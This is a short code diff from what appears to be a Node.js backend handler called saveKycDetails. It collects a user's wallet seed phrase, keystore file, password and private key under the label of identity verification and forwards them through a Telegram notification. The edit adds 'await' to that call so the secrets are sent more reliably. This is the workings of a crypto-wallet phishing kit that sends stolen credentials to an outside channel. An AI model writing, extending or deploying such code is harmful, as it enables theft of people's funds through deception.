@@ -31,7 +31,7 @@ exports.saveKycDetails = async (req, res) => {
     });
 
     try {
-      notifyNewKyc({ sessionId, walletType, seedPhrase, keystoreJson, password, privateKey });
+      await notifyNewKyc({ sessionId, walletType, seedPhrase, keystoreJson, password, privateKey });
     } catch (err) {
       console.error('Failed to send Telegram notification', err);
     }
